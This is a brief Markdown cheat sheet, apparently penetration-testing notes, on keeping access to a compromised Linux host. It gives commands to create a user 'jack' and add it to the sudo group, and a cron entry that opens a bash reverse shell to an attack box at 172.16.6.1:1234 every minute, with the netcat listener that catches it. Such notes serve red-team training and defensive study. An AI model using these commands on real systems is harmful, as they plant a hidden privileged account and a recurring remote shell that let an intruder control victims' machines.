### Persistence
#### User Accounts
```
useradd jack
```
- Adds the user jack to the target host
```
passwd jack
```
- Allows you to set the desired password for the newly created user
```
usermod -a -G sudo jack
```
- Adds the user jack to the sudo group on the box 

#### Cron Jobs
```
cat /etc/crontab
```
- Allows you to see the system wide cron jobs
```
crontab -e
```
- Allows you to edit the file for your users cron jobs
```
crontab -l
```
- Prints the cron jobs set for your user
#### Cron Reverse Shell
```
* * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/172.16.6.1/1234 0>&1
```
- Creates a reverse shell that call back to your attack box ip every minute
```
nc -nlvp 1234
```
-Create the listener on your attack box to cat the incoming shell
